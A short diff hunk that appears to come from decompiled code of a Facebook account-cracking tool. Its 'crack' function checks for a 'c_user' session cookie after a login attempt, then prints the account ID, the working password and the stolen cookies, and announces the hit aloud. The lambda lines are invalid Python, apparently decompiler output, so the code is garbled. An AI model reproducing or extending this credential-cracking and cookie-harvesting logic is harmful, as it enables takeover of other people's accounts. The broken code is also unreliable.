@@ -1064,7 +1064,7 @@ def crack(idf, pwv):
         if 'c_user' in ses.cookies.get_dict().keys():
             ok += 1
             coki = po.cookies.get_dict()
-            kuki = (lambda .0: for key, value in .0:
+            kuki = (lambda .8: for key, value in .8:
 [ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
             print(f'''\r\x1b[10;92m[Tutul•Ok💚] {idf} • {pw} \x1b[10;91m•> \x1b[10;96m{tutulx(idf)}\n\x1b[10;93m[🌺] = COOKIES • \x1b[10;91m{kuki}\n''')
             os.system('espeak -a 300 " Tutul,  Ok,  id"')
